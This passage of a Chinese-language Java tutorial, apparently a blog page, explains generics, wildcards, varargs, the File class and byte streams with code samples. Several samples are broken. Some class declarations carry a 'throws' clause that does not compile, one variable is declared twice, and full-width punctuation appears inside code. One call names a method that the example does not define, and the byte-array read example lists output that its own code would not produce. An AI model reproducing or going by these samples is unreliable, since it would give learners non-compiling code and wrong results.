<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericMethodDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        MyGenericMethod mm = <span class="keyword">new</span> MyGenericMethod();</span><br><span class="line">        <span class="comment">// 演示看方法提示</span></span><br><span class="line">        mm.show(<span class="string">"aaa"</span>);</span><br><span class="line">        mm.show(<span class="number">123</span>);</span><br><span class="line">        mm.show(<span class="number">12.45</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="含有泛型的接口"><a href="#含有泛型的接口" class="headerlink" title="含有泛型的接口"></a>含有泛型的接口</h2><p>定义格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修饰符 interface接口名&lt;代表泛型的变量&gt; &#123;  &#125;</span><br></pre></td></tr></table></figure>

<p>例如:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyGenericInterface</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> E <span class="title">getE</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用格式：</p>
<p><strong>1、定义类时确定泛型的类型</strong></p>
<p>例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyImp1</span> <span class="keyword">implements</span> <span class="title">MyGenericInterface</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(String e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 省略...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，泛型E的值就是String类型。</p>
<p> <strong>2、始终不确定泛型的类型，直到创建对象时，确定泛型的类型</strong></p>
<p> 例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyImp2</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">MyGenericInterface</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">       	 <span class="comment">// 省略...</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> E <span class="title">getE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>确定泛型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 使用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyImp2&lt;String&gt;  my = <span class="keyword">new</span> MyImp2&lt;String&gt;();  </span><br><span class="line">        my.add(<span class="string">"aa"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>当使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示。但是一旦使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。</p>
<h3 id="通配符基本使用"><a href="#通配符基本使用" class="headerlink" title="通配符基本使用"></a>通配符基本使用</h3><p>泛型的通配符:<strong>不知道使用什么类型来接收的时候,此时可以使用<?,?>表示未知通配符。</strong></p>
<p>此时只能接受数据,不能往该集合中存储数据。</p>
<p>举个例子大家理解使用即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Collection&lt;Integer&gt; list1 = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    getElement(list1);</span><br><span class="line">    Collection&lt;String&gt; list2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    getElement(list2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getElement</span><span class="params">(Collection&lt;?&gt; coll)</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">//？代表可以接收任意类型</span></span><br></pre></td></tr></table></figure>

<h3 id="通配符高级使用—-受限泛型"><a href="#通配符高级使用—-受限泛型" class="headerlink" title="通配符高级使用—-受限泛型"></a>通配符高级使用—-受限泛型</h3><p>之前设置泛型的时候，实际上是可以任意设置的，只要是类就可以设置。但是在JAVA的泛型中可以指定一个泛型的<strong>上限</strong>和<strong>下限</strong>。</p>
<p><strong>泛型的上限</strong>：</p>
<ul>
<li><strong>格式</strong>： <code>类型名称 &lt;? extends 类 &gt; 对象名称</code></li>
<li><strong>意义</strong>： <code>只能接收该类型及其子类</code></li>
</ul>
<p><strong>泛型的下限</strong>：</p>
<ul>
<li><strong>格式</strong>： <code>类型名称 &lt;? super 类 &gt; 对象名称</code></li>
<li><strong>意义</strong>： <code>只能接收该类型及其父类型</code></li>
</ul>
<p>比如：现已知Object类，String 类，Number类，Integer类，其中Number是Integer的父类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Collection&lt;Integer&gt; list1 = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    Collection&lt;String&gt; list2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    Collection&lt;Number&gt; list3 = <span class="keyword">new</span> ArrayList&lt;Number&gt;();</span><br><span class="line">    Collection&lt;Object&gt; list4 = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">    </span><br><span class="line">    getElement(list1);</span><br><span class="line">    getElement(list2);<span class="comment">//报错</span></span><br><span class="line">    getElement(list3);</span><br><span class="line">    getElement(list4);<span class="comment">//报错</span></span><br><span class="line">  </span><br><span class="line">    getElement2(list1);<span class="comment">//报错</span></span><br><span class="line">    getElement2(list2);<span class="comment">//报错</span></span><br><span class="line">    getElement2(list3);</span><br><span class="line">    getElement2(list4);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getElement1</span><span class="params">(Collection&lt;? extends Number&gt; coll)</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">// 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getElement2</span><span class="params">(Collection&lt;? <span class="keyword">super</span> Number&gt; coll)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><p>在JDK1.5之后，如果我们定义一个方法需要接受多个参数，并且多个参数类型一致，我们可以对其简化成如下格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型... 形参名)&#123; &#125;</span><br></pre></td></tr></table></figure>

<p>其实这个书写完全等价与</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型[] 形参名)&#123; &#125;</span><br></pre></td></tr></table></figure>

<p>只是后面这种定义，在调用时必须传递数组，而前者可以直接传递数据即可。 </p>
<p>JDK1.5以后。出现了简化操作。</p>
<p>… 用在参数上，称之为可变参数。</p>
<p>同样是代表数组，但是在调用这个带有可变参数的方法时，不用创建数组(这就是简单之处)，直接将数组中的元素，作为实际参数进行传递，其实编译成的class文件，将这些元素先封装到一个数组中，再进行传递。这些动作都在编译.class文件时自动完成的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChangeArgs</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] arr = &#123; <span class="number">1</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">431</span>, <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> sum = getSum(arr);</span><br><span class="line">System.out.println(sum);</span><br><span class="line"><span class="comment">// 6 7 2 12 2121</span></span><br><span class="line"><span class="comment">// 求 这几个元素和 6 7 2 12 2121</span></span><br><span class="line"><span class="keyword">int</span> sum2 = getSum(<span class="number">6</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">2121</span>);</span><br><span class="line">System.out.println(sum2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 完成数组 所有元素的求和 原始写法</span></span><br><span class="line"><span class="comment">public static int getSum(int[] arr)&#123;</span></span><br><span class="line"><span class="comment">int sum = 0;</span></span><br><span class="line"><span class="comment">for(int a : arr)&#123;</span></span><br><span class="line"><span class="comment">sum += a;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">return sum;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//可变参数写法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span>... arr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> a : arr) &#123;</span><br><span class="line">sum += a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="File类"><a href="#File类" class="headerlink" title="File类"></a>File类</h1><p><code>java.io.File</code> 类是文件和目录路径名的抽象表示，主要用于文件和目录的创建、查找和删除等操作。</p>
<h2 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h2><p><code>public File(String pathname)</code> ：通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例。</p>
<p><code>public File(String parent, String child)</code>：从父路径名字符串和子路径名字符串创建新的 File实例。</p>
<p><code>public File(File parent, String child)</code>：从父抽象路径名和子路径名字符串创建新的 File实例。 </p>
<p>构造举例，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件路径名</span></span><br><span class="line">String pathname = <span class="string">"D:\\aaa.txt"</span>;</span><br><span class="line">File file1 = <span class="keyword">new</span> File(pathname);</span><br><span class="line"><span class="comment">// 文件路径名</span></span><br><span class="line">String pathname2 = <span class="string">"D:\\aaa\\bbb.txt"</span>;</span><br><span class="line">File file2 = <span class="keyword">new</span> File(pathname2);</span><br><span class="line"><span class="comment">// 通过父路径和子路径字符串</span></span><br><span class="line">String parent = <span class="string">"d:\\aaa"</span>;</span><br><span class="line">String child = <span class="string">"bbb.txt"</span>;</span><br><span class="line">File file3 = <span class="keyword">new</span> File(parent, child);</span><br><span class="line"><span class="comment">// 通过父级File对象和子路径字符串</span></span><br><span class="line">File parentDir = <span class="keyword">new</span> File(<span class="string">"d:\\aaa"</span>);</span><br><span class="line">String child = <span class="string">"bbb.txt"</span>;</span><br><span class="line">File file4 = <span class="keyword">new</span> File(parentDir, child);</span><br></pre></td></tr></table></figure>

<h2 id="获取功能的方法-1"><a href="#获取功能的方法-1" class="headerlink" title="获取功能的方法"></a>获取功能的方法</h2><p><code>public String getAbsolutePath()</code> ：返回此File的绝对路径名字符串。 </p>
<p><code>public String getPath()</code>：将此File转换为路径名字符串。 </p>
<p><code>public String getName()</code>：返回由此File表示的文件或目录的名称。 </p>
<p><code>public long length()</code> ：返回由此File表示的文件的长度。</p>
<h2 id="判断功能的方法"><a href="#判断功能的方法" class="headerlink" title="判断功能的方法"></a>判断功能的方法</h2><p><code>public boolean exists()</code> ：此File表示的文件或目录是否实际存在。 </p>
<p><code>public boolean isDirectory()</code> ：此File表示的是否为目录。 </p>
<p><code>public boolean isFile()</code> ：此File表示的是否为文件。</p>
<h2 id="创建删除的方法"><a href="#创建删除的方法" class="headerlink" title="创建删除的方法"></a>创建删除的方法</h2><p><code>public boolean createNewFile()</code>：当且仅当具有该名称的文件尚不存在时，创建一个新的空文件。 </p>
<p><code>public boolean delete()</code> ：删除由此File表示的文件或目录。</p>
<p><code>public boolean mkdir()</code>：创建由此File表示的目录。</p>
<p><code>public boolean mkdirs()</code> ：创建由此File表示的目录，包括任何必需但不存在的父目录。</p>
<h2 id="目录遍历的方法"><a href="#目录遍历的方法" class="headerlink" title="目录遍历的方法"></a>目录遍历的方法</h2><p><code>public String[] list()</code> ：返回一个String数组，表示该File目录中的所有子文件或目录。 </p>
<p><code>public File[] listFiles()</code> ：返回一个File数组，表示该File目录中的所有的子文件或目录。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileFor</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">File dir = <span class="keyword">new</span> File(<span class="string">"d:\\java_code"</span>);</span><br><span class="line"><span class="comment">//获取当前目录下的文件以及文件夹的名称。</span></span><br><span class="line">String[] names = dir.list();</span><br><span class="line"><span class="keyword">for</span>(String name : names)&#123;</span><br><span class="line">System.out.println(name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取当前目录下的文件以及文件夹对象，只要拿到了文件对象，那么就可以获取更多信息</span></span><br><span class="line">File[] files = dir.listFiles();</span><br><span class="line"><span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">System.out.println(file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="I-O-流"><a href="#I-O-流" class="headerlink" title="I/O 流"></a>I/O 流</h1><p>一切视角以内存为主。</p>
<p>根据数据的流向分为：输入流和输出流。 </p>
<ul>
<li>输入流 ：把数据从 其他设备 上读取到 内存 中的流。 </li>
<li>输出流 ：把数据从 内存 中写出到 其他设备 上的流。 </li>
</ul>
<p>格局数据的类型分为：字节流和字符流。 </p>
<ul>
<li>字节流 ：以字节为单位，读写数据的流。 </li>
<li>字符流 ：以字符为单位，读写数据的流。</li>
</ul>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429203709515.png" alt="image-20200429203709515"></p>
<h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><p>一切文件数据(文本、图片、视频等)在存储时，都是以二进制数字的形式保存，都一个一个的字节，那么传输时一 样如此。所以，字节流可以传输任意文件数据。在操作流的时候，我们要时刻明确：</p>
<p>无论使用什么样的流对象，底层传输的始终为二进制数据。</p>
<h3 id="OutputStream-字节输出流"><a href="#OutputStream-字节输出流" class="headerlink" title="OutputStream 字节输出流"></a>OutputStream 字节输出流</h3><p>java.io.OutputStream 是表示字节输出流的所有类的超类，将指定的字节信息写出到目的地。它定义了字节输出流的基本共性功能方法。 </p>
<p><code>public void close()</code>：关闭此输出流并释放与此流相关联的任何系统资源。 </p>
<p><code>public void flush()</code>：刷新此输出流并强制任何缓冲的输出字节被写出。 </p>
<p><code>public void write(byte[] b)</code> ：将 b.length字节从指定的字节数组写入此输出流。 </p>
<p><code>public void write(byte[] b, int off, int len)</code>：从指定的字节数组写入 len字节，从偏移量 off开始输出到此输出流。 </p>
<p><code>public abstract void write(int b)</code>：将指定的字节输出流。 </p>
<p>小贴士： close方法，当完成流的操作时，必须调用此方法，释放系统资源。</p>
<h4 id="FileOutputStream类"><a href="#FileOutputStream类" class="headerlink" title="FileOutputStream类"></a>FileOutputStream类</h4><p>OutputStream 有很多子类，我们从最简单的一个子类开始。 </p>
<p>java.io.FileOutputStream 类是文件输出流，用于将数据写出到文件里面。</p>
<p>构造方法：</p>
<p><code>public FileOutputStream(File file)</code> ：创建文件输出流以写入由指定的 File对象表示的文件。 </p>
<p><code>public FileOutputStream(String name)</code>： 创建文件输出流以指定的名称写入文件。</p>
<p>当你创建一个流对象时，必须传入一个文件路径。该路径下，如果没有这个文件，会创建该文件。如果有这个文件，会清空这个文件的数据。</p>
<p>Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileOutputStreamConstructor</span> <span class="title">throws</span> <span class="title">IOException</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 使用File对象创建流对象</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"a.txt"</span>);</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"b.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写出字节：</p>
<p><code>write(int b)</code> 方法，每次可以写出一个字节数据，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"fos.txt"</span>);</span><br><span class="line"><span class="comment">// 写出数据</span></span><br><span class="line">fos.write(<span class="number">97</span>); <span class="comment">// 写出第1个字节</span></span><br><span class="line">fos.write(<span class="number">98</span>); <span class="comment">// 写出第2个字节</span></span><br><span class="line">fos.write(<span class="number">99</span>); <span class="comment">// 写出第3个字节</span></span><br><span class="line"><span class="comment">// 关闭资源，一定记得</span></span><br><span class="line">fos.close();</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>

<p>写出字节数组：</p>
<p><code>write(byte[] b)</code> 每次可以写出数组中的数据，代码使用演示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class FOSWrite &#123;</span><br><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">// 使用文件名称创建流对象</span><br><span class="line">FileOutputStream fos = new FileOutputStream(&quot;fos.txt&quot;);</span><br><span class="line">// 字符串转换为字节数组</span><br><span class="line">byte[] b = &quot;程序员&quot;.getBytes();</span><br><span class="line">// 写出字节数组数据</span><br><span class="line">fos.write(b);</span><br><span class="line">// 关闭资源</span><br><span class="line">fos.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">程序员</span><br></pre></td></tr></table></figure>

<p>写出指定长度字节数组： </p>
<p><code>write(byte[] b, int off, int len)</code>,每次写出从off索引开始，len个字节，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FOSWrite</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"fos.txt"</span>);</span><br><span class="line"><span class="comment">// 字符串转换为字节数组</span></span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="string">"abcde"</span>.getBytes();</span><br><span class="line"><span class="comment">// 写出从索引2开始，2个字节。索引2是c，两个字节，也就是cd。</span></span><br><span class="line">fos.write(b,<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fos.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">cd</span><br></pre></td></tr></table></figure>

<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429205536626.png" alt="image-20200429205536626"></p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429205618717.png" alt="image-20200429205618717"></p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429205702501.png" alt="image-20200429205702501"></p>
<h3 id="InputStream-字节输入流"><a href="#InputStream-字节输入流" class="headerlink" title="InputStream 字节输入流"></a>InputStream 字节输入流</h3><p>java.io.InputStream 抽象类是表示字节输入流的所有类的超类，可以读取字节信息到内存中。</p>
<p>它定义了字节输入流的基本共性功能方法。</p>
<p><code>public void close()</code>：关闭此输入流并释放与此流相关联的任何系统资源。 <code>public abstract int read()</code> ： 从输入流读取数据的下一个字节。 </p>
<p><code>public int read(byte[] b)</code> ： 从输入流中读取一些字节数，并将它们存储到字节数组 b中 。</p>
<h4 id="FileInputStream类"><a href="#FileInputStream类" class="headerlink" title="FileInputStream类"></a>FileInputStream类</h4><p>java.io.FileInputStream 类是文件输入流，从文件中读取字节。</p>
<p>构造方法：</p>
<p><code>FileInputStream(File file)</code> ： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的 File对象 file命名。 </p>
<p><code>FileInputStream(String name)</code> ： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的路径名 name命名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileInputStreamConstructor</span> <span class="title">throws</span> <span class="title">IOException</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 使用File对象创建流对象</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"a.txt"</span>);</span><br><span class="line">FileInputStream fos = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileInputStream fos = <span class="keyword">new</span> FileInputStream(<span class="string">"b.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取字节：</p>
<p><code>read</code> 方法，【每次】可以读取一个字节的数据，提升为int类型，读取到文件末尾，返回 -1 ，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FISRead</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"read.txt"</span>);</span><br><span class="line"><span class="comment">// 读取数据，返回一个字节</span></span><br><span class="line"><span class="keyword">int</span> read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println((<span class="keyword">char</span>) read);</span><br><span class="line"><span class="comment">// 读取到末尾,返回‐1</span></span><br><span class="line">read = fis.read();</span><br><span class="line">System.out.println(read);</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br><span class="line">‐<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>循环改进读取方式，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FISRead</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"read.txt"</span>);</span><br><span class="line"><span class="comment">// 定义变量，保存数据</span></span><br><span class="line"><span class="keyword">int</span> b ；</span><br><span class="line"><span class="comment">// 循环读取</span></span><br><span class="line"><span class="keyword">while</span> ((b = fis.read())!=‐<span class="number">1</span>) &#123;</span><br><span class="line">System.out.println((<span class="keyword">char</span>)b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br></pre></td></tr></table></figure>

<p>使用字节数组读取：</p>
<p><code>read(byte[] b)</code>，每次读取b的长度个字节到数组中，返回读取到的有效字节个数，读 取到末尾时，返回 -1 ，代码使用演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FISRead</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="comment">// 使用文件名称创建流对象.</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"read.txt"</span>); <span class="comment">// 文件中为abcde</span></span><br><span class="line"><span class="comment">// 定义变量，作为有效个数</span></span><br><span class="line"><span class="keyword">int</span> len ；</span><br><span class="line"><span class="comment">// 定义字节数组，作为装字节数据的容器,大小为2</span></span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span>];</span><br><span class="line"><span class="comment">// 循环读取</span></span><br><span class="line"><span class="keyword">while</span> (( len= fis.read(b))!=‐<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 每次读取后,把数组变成字符串打印</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(b，<span class="number">0</span>，len));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">fis.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：</span><br><span class="line">ab</span><br><span class="line">cd</span><br><span class="line">ed</span><br></pre></td></tr></table></figure>

<p>复制图片文件，代码使用演示：</p>
